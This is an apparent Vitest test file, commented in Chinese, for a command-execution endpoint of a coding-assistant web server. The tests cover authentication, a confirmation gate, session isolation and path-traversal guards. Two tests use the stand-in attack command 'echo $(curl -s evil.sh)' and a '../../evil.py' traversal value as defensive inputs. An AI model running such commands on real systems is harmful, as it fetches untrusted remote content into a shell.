import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { EventEmitter } from 'node:events'
import { mkdtempSync, rmSync, readFileSync, writeFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer, type Server, type IncomingMessage, type ServerResponse } from 'node:http'
import { ToolRegistry, type ResolvedSettings } from '@zuse/core'
import { RunRegistry, SNIPPET_POLICY, type RunDeps } from '@zuse/tools'
import { streamRun, __resetExecConsent } from './runsRoutes.js'
import { PasswordStore } from '../auth/passwordStore.js'
import { LocalPasswordAuth } from '../auth/authProvider.js'
import { SessionService } from '../session/SessionService.js'
import { SessionManager } from '../session/SessionManager.js'
import type { CreateSessionOpts } from '../session/createSession.js'
import { fakeClient, fakeSnapshotStore, interactiveOpts } from '../session/testFakes.js'
import { makeRequestHandler } from '../http/server.js'
import type { RequestHandlerDeps } from '../http/server.js'

function makeSettings(): ResolvedSettings {
  return { providers: {}, tools: {}, permissions: { defaultMode: 'default', allow: [], deny: [], ask: [] } } as unknown as ResolvedSettings
}
function fakeCreateSession(opts: CreateSessionOpts): SessionManager {
  const { client } = fakeClient([])
  return new SessionManager({
    sessionId: opts.sessionId, cwd: opts.cwd, client, registry: new ToolRegistry(), systemPrompt: 'SYS',
    ...interactiveOpts(makeSettings()),
    snapshotStore: opts.snapshotStore ?? fakeSnapshotStore(),
    conversation: opts.conversation, checkpoints: opts.checkpoints, createdAt: opts.createdAt,
  })
}

/** 记录每次 spawn，并把假子进程交出去供测试驱动。 */
let spawned: { command: string; cwd: string; env?: NodeJS.ProcessEnv; proc: FakeProc }[]
type FakeProc = EventEmitter & { stdout: EventEmitter; stderr: EventEmitter; pid: number }
function newProc(): FakeProc {
  const p = new EventEmitter() as FakeProc
  p.stdout = new EventEmitter(); p.stderr = new EventEmitter(); p.pid = 9999
  return p
}

let dir: string, srv: Server, base: string, service: SessionService, runs: RunRegistry, sessionId: string
let killedPids: number[] = []

beforeEach(async () => {
  spawned = []
  killedPids = []
  // 同意缓存是**模块级**的，跨测试活着。不清的话「不带 confirmed 该 409」这条会
  // 因为前一个用例确认过同一段代码而拿到 201 —— 实际踩过一次。
  __resetExecConsent()
  dir = mkdtempSync(join(tmpdir(), 'zuse-runs-'))
  const auth = new LocalPasswordAuth(new PasswordStore(dir), 3600)
  service = new SessionService({ dir: join(dir, 'web-sessions'), cwd: 'E:/proj-a', createSession: fakeCreateSession })
  const deps: RunDeps = {
    spawn: (command, opts) => {
      const proc = newProc()
      spawned.push({ command, cwd: opts.cwd, env: opts.env, proc })
      return proc as never
    },
    killTree: (pid: number) => { killedPids.push(pid) },
      killTreeHard: (pid: number) => { killedPids.push(pid) },
    oemLabel: null,
  }
  runs = new RunRegistry({ deps })
  // 只喂这条路由真正会用到的 service —— 其余用 undefined 断言它们没被碰。
  srv = createServer(makeRequestHandler({ auth, service, runs, devPage: false, tokenTtlSec: 3600 } as unknown as RequestHandlerDeps))
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()))
  const addr = srv.address(); const port = typeof addr === 'object' && addr ? addr.port : 0
  base = `http://127.0.0.1:${port}`
  sessionId = (await service.create({ cwd: 'E:/proj-a' })).id
})
afterEach(async () => { runs.disposeAll(); await new Promise<void>((r) => srv.close(() => r())); rmSync(dir, { recursive: true, force: true }) })

const json = (body: unknown) => ({ method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json' } })
async function authCookie(): Promise<string> {
  await fetch(`${base}/api/auth/setup`, json({ password: 'pw' }))
  const login = await fetch(`${base}/api/auth/login`, json({ password: 'pw' }))
  return (login.headers.get('set-cookie') ?? '').split(';')[0] ?? ''
}
const post = (cookie: string, body: unknown) =>
  fetch(`${base}/api/runs`, { method: 'POST', body: JSON.stringify(body), headers: { 'content-type': 'application/json', cookie } })

describe('run 端点 —— 鉴权', () => {
  /**
   * 这是**一个执行任意命令的端点**，鉴权是最不该省的那一行。
   * v4 §0.2 把「逐路由 isAuthed」列为必须保留的一条，这里四条路由各钉一次。
   */
  it('四条路由未登录一律 401', async () => {
    const r1 = await fetch(`${base}/api/runs`, json({ command: 'echo hi', sessionId }))
    const r2 = await fetch(`${base}/api/runs`)
    const r3 = await fetch(`${base}/api/runs/whatever/stream`)
    const r4 = await fetch(`${base}/api/runs/whatever`, { method: 'DELETE' })
    expect([r1.status, r2.status, r3.status, r4.status]).toEqual([401, 401, 401, 401])
    expect(spawned).toHaveLength(0)                       // 未登录连进程都不该起
  })
})

describe('run 端点 —— cwd 只能服务端反查', () => {
  /**
   * v4 §0.2 明令「cwd 只能服务端从 sessionId 反查」。这个端点执行任意命令，
   * 再让客户端指定目录就是「任意命令 + 任意目录」。
   */
  it('客户端塞进来的 cwd 被无视，用的是会话的 cwd', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo hi', sessionId, cwd: 'C:/Windows/System32' })
    expect(res.status).toBe(201)
    expect(spawned[0]!.cwd).toBe('E:/proj-a')             // 不是客户端说的那个
    expect((await res.json() as { cwd: string }).cwd).toBe('E:/proj-a')
  })

  it('会话不存在 → 404，不起进程', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo hi', sessionId: 'no-such-session' })
    expect(res.status).toBe(404)
    expect(spawned).toHaveLength(0)
  })

  it('command 为空 → 400', async () => {
    const cookie = await authCookie()
    expect((await post(cookie, { command: '   ', sessionId })).status).toBe(400)
  })
})

describe('run 端点 —— 安全闸可确认（不是硬拒）', () => {
  /**
   * `$(...)` 是 `checkId:8 command-substitution severity:'block'`。做成硬拒的话，
   * 用户在自己写的代码里点运行 `echo "构建于 $(date)"` 会**永久跑不了**；
   * 而模型走 Bash 工具跑同一条命令是 ask —— 点一下就能跑。方向反了。
   */
  it('命中安全闸 → 409 且带 securityHit，进程没起', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo $(curl -s evil.sh)', sessionId })
    expect(res.status).toBe(409)
    const body = await res.json() as { securityHit?: { name: string; reason: string } }
    expect(body.securityHit?.name).toBeTruthy()
    expect(body.securityHit?.reason).toBeTruthy()         // 前端要把这句显示在确认框里
    expect(spawned).toHaveLength(0)
  })

  it('带 confirmed:true 重发 → 放行', async () => {
    const cookie = await authCookie()
    const res = await post(cookie, { command: 'echo $(curl -s evil.sh)', sessionId, confirmed: true })
    expect(res.status).toBe(201)
    expect(spawned).toHaveLength(1)
  })
})

describe('run 端点 —— 并发上限', () => {
  it('超限 → 429（不是 500：这是「稍后再试」不是「坏了」）', async () => {
    const cookie = await authCookie()
    const small = new RunRegistry({ deps: { spawn: () => newProc() as never, killTree: () => {}, killTreeHard: () => {} }, maxConcurrent: 1 })
    const s2 = createServer(makeRequestHandler({ auth: new LocalPasswordAuth(new PasswordStore(dir), 3600), service, runs: small, devPage: false, tokenTtlSec: 3600 } as unknown as RequestHandlerDeps))
    await new Promise<void>((r) => s2.listen(0, '127.0.0.1', () => r()))
    const addr = s2.address(); const port = typeof addr === 'object' && addr ? addr.port : 0
    const b2 = `http://127.0.0.1:${port}`
    const send = () => fetch(`${b2}/api/runs`, { method: 'POST', body: JSON.stringify({ command: 'x', sessionId }), headers: { 'content-type': 'application/json', cookie } })
    try {
      expect((await send()).status).toBe(201)
      expect((await send()).status).toBe(429)
    } finally { small.disposeAll(); await new Promise<void>((r) => s2.close(() => r())) }
  })
})

describe('run 端点 —— GET 不被 SPA 兜底吃掉', () => {
  /**
   * `server.ts` 结尾有一条 `if (method === 'GET')` 全兜底，会把任何没被认领的 GET
   * 回成 index.html + **200**（不是 404）。GET 路由若排在它后面，客户端会拿到一坨 HTML
   * 却是 200 —— 比 404 难查得多。这条测试就是钉住路由顺序。
   */
  it('GET /api/runs 返回 JSON 列表而不是 HTML', async () => {
    const cookie = await authCookie()
    await post(cookie, { command: 'echo hi', sessionId })
    const res = await fetch(`${base}/api/runs?sessionId=${sessionId}`, { headers: { cookie } })
    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).toContain('application/json')
    const body = await res.json() as { runs: { command: string; cwd: string; status: string }[] }
    expect(body.runs).toHaveLength(1)
    expect(body.runs[0]!.command).toBe('echo hi')
    expect(body.runs[0]!.cwd).toBe('E:/proj-a')
  })

  it('GET 一个不存在的 run 的 stream → 404，不是 index.html', async () => {
    const cookie = await authCookie()
    const res = await fetch(`${base}/api/runs/nope/stream`, { headers: { cookie } })
    expect(res.status).toBe(404)
    expect(res.headers.get('content-type')).toContain('application/json')
  })
})

describe('run 端点 —— SSE', () => {
  /** 本仓此前**没有服务端 SSE**，分帧要自己写，所以这条测试真的去解一遍帧。 */
  it('推 chunk 与 end 两种事件，且分帧可解析', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'echo hi', sessionId })
    const { runId } = await started.json() as { runId: string }
    const proc = spawned[0]!.proc

    const res = await fetch(`${base}/api/runs/${runId}/stream?sessionId=${sessionId}`, { headers: { cookie } })
    expect(res.headers.get('content-type')).toContain('text/event-stream')

    proc.stdout.emit('data', Buffer.from('你好', 'utf8'))
    proc.emit('close', 0)

    const raw = await res.text()
    const events = raw.split('\n\n').filter(Boolean).map((f) => JSON.parse(f.replace(/^data: /, '')))
    expect(events.filter((e) => e.type === 'chunk').map((e) => e.text).join('')).toBe('你好')
    const end = events.find((e) => e.type === 'end')
    // orphaned 是新加的字段：孤儿事实以前只有 `hasOrphan` 这个内部 getter 知道，
    // SSE / GET /api/runs / UI 一律看不到。这条顺带锁住它确实序列化出去了。
    expect(end).toEqual({ type: 'end', reason: 'exit', exitCode: 0, orphaned: false })
  })

  /**
   * **对一个已经结束的 run 开流。** 这条路径上 replay 会**同步**推出 end 事件 ——
   * 也就是说订阅回调在 `const off = run.subscribe(...)` 赋值**之前**就跑了。
   * 回调里引用 `off` 会撞上 TDZ（`Cannot access 'off' before initialization`），
   * 后果是 `res.end()` 永远不执行、这条 SSE 连接一直挂着不收尾。
   */
  it('对已结束的 run 开流：补完历史后必须收尾，连接不能挂住', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'echo hi', sessionId })
    const { runId } = await started.json() as { runId: string }
    const proc = spawned[0]!.proc
    proc.stdout.emit('data', Buffer.from('跑完了', 'utf8'))
    proc.emit('close', 0)                                  // 先结束，再开流

    const res = await fetch(`${base}/api/runs/${runId}/stream?sessionId=${sessionId}`, { headers: { cookie } })
    // res.text() 只有在服务端 res.end() 之后才会 resolve；挂住的话这里会一直等到超时。
    const raw = await Promise.race([
      res.text(),
      new Promise<string>((_, rej) => setTimeout(() => rej(new Error('SSE 没有收尾，连接挂住了')), 3000)),
    ])
    expect(raw).toContain('跑完了')
    const events = raw.split('\n\n').filter(Boolean).map((f) => JSON.parse(f.replace(/^data: /, '')))
    expect(events.find((e) => e.type === 'end')).toBeDefined()
  })

  /** 中途接进来的必须先拿到已有输出，否则只看得到「从现在起」的部分。 */
  it('中途接入时补历史（replay）', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'echo hi', sessionId })
    const { runId } = await started.json() as { runId: string }
    const proc = spawned[0]!.proc

    proc.stdout.emit('data', Buffer.from('早就打过的内容', 'utf8'))
    await new Promise((r) => setTimeout(r, 350))          // 让首窗定码（300ms）
    const res = await fetch(`${base}/api/runs/${runId}/stream?sessionId=${sessionId}`, { headers: { cookie } })
    proc.emit('close', 0)
    const raw = await res.text()
    expect(raw).toContain('早就打过的内容')
  })
})

/**
 * 走真 HTTP 测不到「`res.write` 同步抛」—— Node 对已断开的 socket 是异步报错。
 * 所以这条直接调 `streamRun`，喂一个会抛的假 res。
 */
describe('run 端点 —— SSE 写失败必须退订', () => {
  it('replay 阶段写失败 → 退订 → 片段档把进程收掉（不退订的话它以为还有人在看）', async () => {
    const killed: number[] = []
    let proc!: FakeProc
    const reg = new RunRegistry({
      deps: {
        spawn: () => { proc = newProc(); return proc as never },
        killTree: (pid: number) => { killed.push(pid) },
        killTreeHard: (pid: number) => { killed.push(pid) },
        oemLabel: null,
      },
    })
    try {
      const run = reg.start({ command: 'x', cwd: 'E:/proj-a', sessionId: 's', policy: SNIPPET_POLICY })
      proc.stdout.emit('data', Buffer.from('abc'))
      await new Promise((r) => setTimeout(r, 350))         // 等首窗定码，让 snapshot 非空
      expect(killed).toEqual([])                           // 前置：这时还没人喊杀

      const req = new EventEmitter() as unknown as IncomingMessage
      let writes = 0
      const res = {
        writeHead: () => {}, flushHeaders: () => {},
        write: () => { writes++; throw new Error('socket 已断') },  // replay 的第一次写就炸
        end: () => {}, destroy: () => {},
      } as unknown as ServerResponse
      const handled = streamRun(req, res, run.id, { runs: reg, service })
      // 前置条件先自证，否则下面那条断言可能是「replay 压根没推东西」而不是「退订成功」。
      expect(handled).toBe(true)
      expect(writes).toBe(1)

      // 退订成功 → 订阅者归零 → 片段档 onDetach:'kill' 触发。
      // 补退订那行如果没了，订阅会留在 set 里，这里就是空数组。
      expect(killed).toEqual([proc.pid])
    } finally { reg.disposeAll() }
  })
})

describe('run 端点 —— exec 形态（跑一段代码，不是一条命令）', () => {
  it('POST {exec:{kind:"python",code}} → 起 run，命令是 uv run --no-project', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    expect(r.status).toBe(201)
    expect(spawned).toHaveLength(1)
    expect(spawned[0]!.command).toContain('uv run --no-project')
    // cwd 仍然是**会话的** cwd，不是临时目录 —— 脚本里 open("data.csv") 该读到用户项目的文件
    expect(spawned[0]!.cwd).toBe('E:/proj-a')
  })

  it('代码真的落到磁盘上了，内容一字不差', async () => {
    const cookie = await authCookie()
    const code = 'print("你好")\n# 中文注释'
    const r = await post(cookie, { exec: { kind: 'python', code }, sessionId, confirmed: true })
    const { dir } = await r.json() as { dir: string }
    expect(readFileSync(join(dir, 'main.py'), 'utf8')).toBe(code)
  })

  /**
   * **路径穿越的护栏。** 这个端点新开了「服务端按请求写文件」的能力，
   * 文件名必须只来自 planExec 返回的常量，绝不能被请求体影响。
   */
  it('请求体里塞 kind 之外的东西不会影响落盘路径', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, {
      exec: { kind: 'python', code: 'x', name: '../../evil.py', path: 'C:/evil' },
      sessionId, confirmed: true,
    })
    const { dir } = await r.json() as { dir: string }
    expect(existsSync(join(dir, 'main.py'))).toBe(true)
    expect(dir).toContain('zuse-run-')
    // 目录必须在系统临时目录下，不能是别处
    expect(dir.replace(/\\/g, '/').toLowerCase()).toContain(tmpdir().replace(/\\/g, '/').toLowerCase())
  })

  it('未知 kind → 400，不落盘不起进程', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'ruby', code: 'puts 1' }, sessionId, confirmed: true })
    expect(r.status).toBe(400)
    expect(spawned).toHaveLength(0)
  })

  /**
   * **清理用的订阅必须是 `internal: true`。**
   *
   * 不加的话它会算进「有没有人在看」，于是片段档的 `onDetach:'kill'` 永远触发不了 ——
   * 用户关掉页面，进程照跑到 5 分钟墙钟。这个坑步骤 2 刚踩过一次（注册表自己的订阅），
   * 这里是同一个坑的第二个入口。
   */
  it('清理订阅不算「有人在看」：唯一的外部订阅者退订后，进程被收掉', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'python', code: 'x' }, sessionId, confirmed: true })
    const { runId } = await r.json() as { runId: string }
    const run = runs.get(runId)!
    const off = run.subscribe(() => {})
    expect(killedPids).toEqual([])                 // 前置：有人看着的时候不许杀
    off()
    expect(killedPids).toEqual([spawned[0]!.proc.pid])
  })

  it('run 结束后临时目录被删掉', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'python', code: 'x' }, sessionId, confirmed: true })
    const { dir } = await r.json() as { dir: string }
    expect(existsSync(dir)).toBe(true)
    spawned[0]!.proc.emit('close', 0)
    await new Promise((r2) => setTimeout(r2, 50))
    expect(existsSync(dir)).toBe(false)
  })
})

describe('run 端点 —— 运行代码要先确认', () => {
  /**
   * 内容检测被实测排除了（误报可观、漏报 100%，见 step3 spec §0.1），
   * 所以改成「运行前明确说一次这会在你电脑上真的执行」。
   */
  it('不带 confirmed → 409，且不起进程', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId })
    expect(r.status).toBe(409)
    const body = await r.json() as { error: { code: string } }
    expect(body.error.code).toBe('exec_confirm')
    expect(spawned).toHaveLength(0)
  })

  it('确认过一次之后，同一段代码不再问', async () => {
    const cookie = await authCookie()
    await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    const again = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId })
    expect(again.status).toBe(201)
  })

  /** 代码是逐字执行的，改一个字符就是另一段程序。 */
  it('改一个字符就重新问', async () => {
    const cookie = await authCookie()
    await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    const other = await post(cookie, { exec: { kind: 'python', code: 'print(2)' }, sessionId })
    expect(other.status).toBe(409)
  })

  it('Java 的 hint 会带在 409 里（跑不起来的形态先说一声）', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'java', code: 'System.out.println(1);' }, sessionId })
    const body = await r.json() as { hint?: string }
    expect(body.hint).toContain('类')
  })
})

/**
 * **会话隔离。** 这几条守的是「一个会话看不见/动不了另一个会话的 run」。
 *
 * 单槽时看不出来（前端只挂一个），但 API 早就暴露了：`list()` 返回全部、
 * DELETE 和 stream 都只按 runId。步骤 4 的在飞列表会把它直接摆到界面上。
 * runId 是 uuid 猜不到 —— 但「猜不到」不是授权。
 */
/**
 * **档位由服务端按请求形态推导，绝不让客户端传。**
 *
 * 让客户端传 `policy` 等于：任何客户端都能给**任意命令**要来「无墙钟 + 断连不杀」——
 * 一个永远跑着、没人看着、没有上限的进程。档位是服务端从请求形态得出的结论，不是输入。
 */
describe('run 端点 —— 选档', () => {
  it('{command} → 项目档：无墙钟、无空闲超时、断连保留', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { command: 'pnpm dev', sessionId, confirmed: true })
    expect(r.status).toBe(201)
    const run = runs.get((await r.json() as { runId: string }).runId)!
    expect(run.policy.wallClockMs).toBeNull()
    expect(run.policy.idleMs).toBeNull()               // dev server 安静下来不该被当成卡死
    expect(run.policy.onDetach).toBe('keep')
    expect(run.policy.sink.kind).toBe('ring')
  })

  it('{exec} → 片段档：有墙钟、断连就杀、超预算就杀', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    const run = runs.get((await r.json() as { runId: string }).runId)!
    expect(run.policy.wallClockMs).toBeGreaterThan(0)
    expect(run.policy.onDetach).toBe('kill')
    expect(run.policy.sink.kind).toBe('truncate')
  })

  it('客户端塞 policy 字段被无视（不能自己要一个不受限的档）', async () => {
    const cookie = await authCookie()
    const r = await post(cookie, {
      exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true,
      policy: { wallClockMs: null, idleMs: null, onDetach: 'keep', sink: { kind: 'ring', chars: 9_000_000 } },
    })
    const run = runs.get((await r.json() as { runId: string }).runId)!
    expect(run.policy.wallClockMs).toBeGreaterThan(0)   // 仍是片段档，客户端说了不算
    expect(run.policy.onDetach).toBe('kill')
  })
})

describe('scripts 端点 —— 项目里有哪些可跑的脚本', () => {
  it('读当前会话 cwd 的 package.json，回 scripts 列表', async () => {
    const cookie = await authCookie()
    const proj = mkdtempSync(join(tmpdir(), 'zuse-proj-'))
    writeFileSync(join(proj, 'package.json'), JSON.stringify({ scripts: { dev: 'vite', build: 'tsc && vite build' } }))
    const sid = (await service.create({ cwd: proj })).id
    const r = await fetch(`${base}/api/scripts?sessionId=${sid}`, { headers: { cookie } })
    expect(r.status).toBe(200)
    const body = await r.json() as { cwd: string; scripts: { name: string; command: string }[] }
    expect(body.cwd).toBe(proj)
    expect(body.scripts).toEqual([
      { name: 'dev', command: 'vite' },
      { name: 'build', command: 'tsc && vite build' },
    ])
    rmSync(proj, { recursive: true, force: true })
  })

  /** 没有 package.json 不是错误 —— 大把项目不是 Node 的。给空列表，别让前端崩。 */
  it('没有 package.json → 空列表，不是 500', async () => {
    const cookie = await authCookie()
    const r = await fetch(`${base}/api/scripts?sessionId=${sessionId}`, { headers: { cookie } })
    expect(r.status).toBe(200)
    expect((await r.json() as { scripts: unknown[] }).scripts).toEqual([])
  })

  it('package.json 是坏 JSON → 空列表，不是 500', async () => {
    const cookie = await authCookie()
    const proj = mkdtempSync(join(tmpdir(), 'zuse-proj-'))
    writeFileSync(join(proj, 'package.json'), '{ 这不是 json')
    const sid = (await service.create({ cwd: proj })).id
    const r = await fetch(`${base}/api/scripts?sessionId=${sid}`, { headers: { cookie } })
    expect(r.status).toBe(200)
    expect((await r.json() as { scripts: unknown[] }).scripts).toEqual([])
    rmSync(proj, { recursive: true, force: true })
  })

  it('未登录 → 401', async () => {
    expect((await fetch(`${base}/api/scripts?sessionId=${sessionId}`)).status).toBe(401)
  })
})

describe('run 端点 —— 会话隔离', () => {
  async function twoSessions(cookie: string) {
    const other = (await service.create({ cwd: 'E:/proj-b' })).id
    const a = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    const b = await post(cookie, { exec: { kind: 'python', code: 'print(2)' }, sessionId: other, confirmed: true })
    return { other, aId: (await a.json() as { runId: string }).runId, bId: (await b.json() as { runId: string }).runId }
  }

  it('列表只给本会话的 run（否则右栏会列出别处正在干什么）', async () => {
    const cookie = await authCookie()
    const { aId, bId } = await twoSessions(cookie)
    const r = await fetch(`${base}/api/runs?sessionId=${sessionId}`, { headers: { cookie } })
    const { runs } = await r.json() as { runs: { id: string }[] }
    expect(runs.map((x) => x.id)).toContain(aId)
    expect(runs.map((x) => x.id)).not.toContain(bId)
  })

  it('不带 sessionId 的列表请求 → 400，不返回全部', async () => {
    const cookie = await authCookie()
    const r = await fetch(`${base}/api/runs`, { headers: { cookie } })
    expect(r.status).toBe(400)
  })

  it('停不掉别的会话的 run', async () => {
    const cookie = await authCookie()
    const { bId } = await twoSessions(cookie)
    const r = await fetch(`${base}/api/runs/${bId}?sessionId=${sessionId}`, { method: 'DELETE', headers: { cookie } })
    expect(r.status).toBe(404)
    expect(runs.get(bId)!.status).toBe('running')       // 真的没被停
  })

  it('订阅不到别的会话的输出流', async () => {
    const cookie = await authCookie()
    const { bId } = await twoSessions(cookie)
    const r = await fetch(`${base}/api/runs/${bId}/stream?sessionId=${sessionId}`, { headers: { cookie } })
    expect(r.status).toBe(404)
    expect(r.headers.get('content-type')).not.toContain('text/event-stream')
  })

  it('同一段代码在另一个会话里要重新确认（同意缓存按会话隔离）', async () => {
    const cookie = await authCookie()
    const other = (await service.create({ cwd: 'E:/proj-a' })).id   // **同一个 cwd**
    await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId, confirmed: true })
    const again = await post(cookie, { exec: { kind: 'python', code: 'print(1)' }, sessionId: other })
    expect(again.status).toBe(409)
  })
})

describe('run 端点 —— DELETE', () => {
  it('DELETE 返回 202（已受理），条目仍在 —— 逐出只在收到 exit 时', async () => {
    const cookie = await authCookie()
    const started = await post(cookie, { command: 'sleep 100', sessionId })
    const { runId } = await started.json() as { runId: string }

    const res = await fetch(`${base}/api/runs/${runId}?sessionId=${sessionId}`, { method: 'DELETE', headers: { cookie } })
    expect(res.status).toBe(202)                          // 不是 204：这是「已受理」不是「已完成」
    expect(runs.get(runId)!.status).toBe('killing')       // 还没死，条目还在

    const list = await (await fetch(`${base}/api/runs?sessionId=${sessionId}`, { headers: { cookie } })).json() as { runs: { status: string }[] }
    expect(list.runs[0]!.status).toBe('killing')
  })

  it('DELETE 不存在的 id → 404', async () => {
    const cookie = await authCookie()
    expect((await fetch(`${base}/api/runs/nope`, { method: 'DELETE', headers: { cookie } })).status).toBe(404)
  })
})

describe('run 端点 —— 子进程环境', () => {
  it('env 经白名单过滤，且带上 runner 声明的 Python 变量', async () => {
    const cookie = await authCookie()
    await post(cookie, { command: 'echo hi', sessionId })
    const env = spawned[0]!.env!
    expect(env.PYTHONUNBUFFERED).toBe('1')
    expect(env.PYTHONIOENCODING).toBe('utf-8')
    // JAVA_TOOL_OPTIONS **刻意不给**：实测它会让 JVM 往 stderr 打一行
    // 「Picked up JAVA_TOOL_OPTIONS: …」，每次跑 Java 都凭空多一行垃圾。
    // spec §5 写的是「按语言注入」，而本步只有一个裸 command、认不出语言 → 推给步骤 3。
    expect(env.JAVA_TOOL_OPTIONS).toBeUndefined()
    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
  })
})
